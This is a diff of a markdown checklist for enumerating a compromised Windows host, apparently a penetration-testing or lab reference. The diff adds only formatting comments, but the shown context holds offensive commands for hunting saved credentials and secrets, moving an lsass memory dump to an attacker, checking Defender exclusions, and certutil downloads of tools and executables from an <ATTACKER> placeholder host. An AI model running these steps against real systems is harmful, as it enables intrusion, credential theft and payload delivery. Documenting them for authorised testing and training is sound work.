@@ -12,6 +12,7 @@ Checklist for enumerating a Windows host after landing a shell (Meterpreter / Wi
 
 ## 1. Where am I System Context
 
+<!-- cmd: windows -->
 ```powershell
 whoami                                  # [USED — Blueprint, Logging]
 whoami /all                             # groups + privileges + SID
@@ -25,6 +26,7 @@ $PSVersionTable                         # PowerShell version
 ```
 
 Equivalent `cmd.exe` one-liners:
+<!-- cmd: windows -->
 ```cmd
 ver
 set
@@ -35,6 +37,7 @@ wmic os get caption,csname,version,buildnumber
 
 ## 2. User & Privileges
 
+<!-- cmd: windows -->
 ```powershell
 whoami /priv
 net user                                # local users
@@ -63,6 +66,7 @@ Red flags in `whoami /priv`:
 
 ## 3. Domain Context
 
+<!-- cmd: windows -->
 ```powershell
 # Am I domain-joined
 (Get-WmiObject Win32_ComputerSystem).PartOfDomain
@@ -78,6 +82,7 @@ nltest /domain_trusts /all_trusts
 ```
 
 ### PowerView (when allowed)
+<!-- cmd: windows -->
 ```powershell
 Import-Module .\PowerView.ps1
 Get-Domain
@@ -90,6 +95,7 @@ Get-DomainUser -PreauthNotRequired       # AS-REP roastable
 ```
 
 ### AD module (on DCs or with RSAT)
+<!-- cmd: windows -->
 ```powershell
 Get-ADUser -Filter * -Properties ServicePrincipalName | Where ServicePrincipalName
 Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'
@@ -101,6 +107,7 @@ Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'
 
 ### Standard dumping grounds
 
+<!-- cmd: windows -->
 ```powershell
 # Saved creds (cmdkey)
 cmdkey /list                            # [USED — Overwatch]
@@ -133,6 +140,7 @@ dir /s /a C:\*.kdbx 2>nul
 
 ### String-level sweep for secrets
 
+<!-- cmd: windows -->
 ```powershell
 # Grep-equivalent across the filesystem (slow)
 Get-ChildItem -Path C:\ -Recurse -Include *.xml,*.config,*.ini,*.ps1,*.bat,*.txt,*.properties -ErrorAction SilentlyContinue |
@@ -159,6 +167,7 @@ Transfer `lsass.dmp` to the attacker and parse with `pypykatz lsa minidump lsass
 
 ## 5. Scheduled Tasks & Services
 
+<!-- cmd: windows -->
 ```powershell
 # Scheduled tasks
 schtasks /query /fo LIST /v               # [USED — baseline]
@@ -181,6 +190,7 @@ Look for:
 
 ## 6. Networking
 
+<!-- cmd: windows -->
 ```powershell
 ipconfig /all
 route print
@@ -191,6 +201,7 @@ Get-NetTCPConnection | Where State -eq Listen
 ```
 
 ### DNS / AD services
+<!-- cmd: windows -->
 ```powershell
 nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
 nslookup -type=srv _kerberos._tcp.<domain>
@@ -200,6 +211,7 @@ nslookup -type=srv _kerberos._tcp.<domain>
 
 ## 7. Interesting Files & Paths
 
+<!-- cmd: windows -->
 ```powershell
 # User profiles
 dir C:\Users\
@@ -226,6 +238,7 @@ type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Conso
 
 ### Check for NSSM wrappers (Overwatch pivot)
 Look for `nssm.exe` in service PathName — NSSM wraps non-service binaries as Windows services, and the wrapped binary is often replaceable:
+<!-- cmd: windows -->
 ```powershell
 Get-WmiObject win32_service | Where { $_.PathName -match 'nssm' }
 ```
@@ -235,6 +248,7 @@ See [nssm-service-abuse.md](../privesc-windows/nssm-service-abuse.md).
 
 ## 8. AD Sessions & Logged-On Users
 
+<!-- cmd: windows -->
 ```powershell
 # Who is logged on right now
 query user
@@ -250,6 +264,7 @@ Find-DomainProcess -ProcessName lsass
 
 ## 9. UAC / AppLocker / AMSI / Defender Posture
 
+<!-- cmd: windows -->
 ```powershell
 # UAC
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
@@ -284,6 +299,7 @@ Get-MpPreference | Select-Object -Property ExclusionPath, DisableRealtimeMonitor
 
 ## 11. Automated Tooling
 
+<!-- cmd: windows -->
 ```powershell
 # winPEAS
 certutil -urlcache -f http://<ATTACKER>/winPEAS.ps1 winPEAS.ps1   # [USED — Logging]
@@ -307,6 +323,7 @@ SharpUp.exe audit
 
 ## 12. Transferring Payloads In
 
+<!-- cmd: windows -->
 ```powershell
 # certutil
 certutil -urlcache -f http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe    # [USED — Logging, Blueprint]
@@ -332,6 +349,7 @@ sudo smbserver.py share $(pwd) -smb2support
 
 ## 13. Cleanup
 
+<!-- cmd: windows -->
 ```powershell
 # Remove uploaded tools
 del C:\Windows\Temp\winPEAS.ps1
